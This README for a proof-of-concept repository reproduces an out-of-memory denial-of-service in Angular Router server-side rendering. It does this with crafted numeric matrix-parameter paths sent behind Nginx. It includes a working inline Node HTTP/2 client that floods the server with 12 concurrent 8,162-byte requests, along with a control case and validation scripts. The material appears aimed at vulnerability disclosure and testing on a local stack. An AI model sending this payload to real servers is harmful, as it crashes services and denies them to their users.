# Angular Router numeric matrix-parameter OOM

Minimal reproduction of an Angular Router out-of-memory failure during server-side rendering (SSR).

```text
Candidate: /a;990;2522   numeric matrix-parameter names
Control:   /a;aaa;bbbb   normal string names
```

Both paths have the same size. Under concurrent SSR requests, the candidate exhausts the V8 heap while the control remains healthy.

Nginx 1.31.5 uses a small production-like reverse-proxy configuration:

- HTTP/2 from the client and HTTP/1.1 keepalive to Angular.
- Standard forwarded headers and proxy timeouts.
- Health checks before requests start.
- Default-sized `large_client_header_buffers 4 8k` buffers.
- An 8,162-byte request path, just below the 8 KiB request-line limit.

Nginx terminates the client HTTP/2 connection and uses separate HTTP/1.1 keepalive connections to Angular. This is normal reverse-proxy behavior, not a protocol fallback. The local test uses cleartext HTTP/2 (`h2c`); public deployments normally terminate HTTP/2 over TLS.

## Automated test

The validator starts fresh containers, runs the control, triggers the candidate OOM, and confirms Docker did not kill the container:

```bash
./scripts/validate.sh 256
./scripts/validate.sh 512
```

Evidence is written to `evidence/run-256/` and `evidence/run-512/`.

Optional fast V8-only check:

```bash
node scripts/check-v8.mjs all
```

## Manual HTTP/2 test

The candidate intentionally crashes the SSR worker. Use only this disposable local stack.

Start Angular SSR with a 256 MiB V8 old-space limit and Nginx:

```bash
HEAP_MB=256 docker compose up -d --build --wait app nginx
```

From Bash on Windows, send the candidate workload through Nginx's exposed port:

```bash
HEAP_MB=256 TARGET_URL=http://127.0.0.1:8080 node client/send.mjs
```

Equivalent inline client, with no project script execution:

```bash
node --input-type=module -e '
import http2 from "node:http2";

const client = http2.connect("http://127.0.0.1:8080");
client.on("error", () => {});

const path = "/a;990;2522".repeat(742);

await Promise.all(
  Array.from({ length: 12 }, () =>
    new Promise((done) => {
      const request = client.request({ ":path": path });
      request.on("response", () => request.resume());
      request.on("end", done);
      request.on("error", done);
      request.end();
    }),
  ),
);

client.close();
'
```

This sends 12 concurrent 8,162-byte requests over one HTTP/2 connection. Confirm the V8 failure:

```bash
docker compose logs app | grep -E 'Reached heap limit|JavaScript heap out of memory'
docker inspect "$(docker compose ps -a -q app)" --format '{{.State.OOMKilled}}'
```

Expected: a V8 heap error and `false`. `false` proves the kernel did not kill the container.

This path reached the V8 OOM in 5/5 fresh runs with Windows Node.js 24.16.0 and the fixed 500 ms resolver.

To run the harmless control:

```bash
docker compose up -d --wait app nginx
HEAP_MB=256 docker compose run --rm --build control
```

Expected: `12/12` HTTP 200 responses and Angular remains healthy.

## Workloads

| V8 old space | HTTP/2 connections | Concurrent requests | Segments/request | Path size |
| -----------: | -----------------: | ------------------: | ---------------: | --------: |
|      256 MiB |                  1 |                  12 |              742 |   8,162 B |
|      512 MiB |                  1 |                  22 |              742 |   8,162 B |

Each request is held for a fixed 500 ms by the reproduction's route resolver.

## Clean up

```bash
docker compose down -v --remove-orphans
```

Only Nginx is exposed, at `127.0.0.1:8080`. Angular remains inside the Compose network.
